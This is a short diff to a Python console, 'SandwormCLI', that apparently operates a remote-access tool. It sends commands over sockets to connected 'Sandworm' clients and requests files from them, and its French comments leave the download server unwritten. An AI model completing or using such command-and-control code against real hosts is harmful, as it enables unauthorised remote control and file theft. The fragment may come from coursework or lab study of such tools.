@@ -13,6 +13,13 @@ class SandwormCLI(cmd.Cmd):
         self.prompt = f"(🐍 Sandworm [{index}:{sandworm["username"]}])> "
 
 
+    def emptyline(self):
+        """
+        Override emptyline to prevent repeating the last command.
+        """
+        pass
+
+
     def do_exec(self, command):
         """
         Execute a command on the Sandworm
@@ -24,7 +31,8 @@ class SandwormCLI(cmd.Cmd):
             return
         
         # TODO : Valider si c'est la meilleure manière de faire, probablement que non
-        self.sandworm["socket"].send(command.encode() + b"\n")
+        sent_command = "echo " + command
+        self.sandworm["socket"].send(sent_command.encode() + b"\n")
 
         print(f"Sent command to Sandworm [{self.index}]: {command}")
 
@@ -44,6 +52,11 @@ class SandwormCLI(cmd.Cmd):
         # (Ca envoie la command download au client)
         self.sandworm["socket"].send(f"DOWNLOAD {file_path}".encode() + b"\n")
         print(f"Requested file '{file_path}' from sandworm [{self.index}]")
+
+        # Appelle la fonction de tcp server qui permet de download
+        # (elle existe pas tu vas devoir l'écrire)
+        # Attends que ca soit terminer avant de revenir ici et de
+        # demander une nouvelle commande
 
         return
 
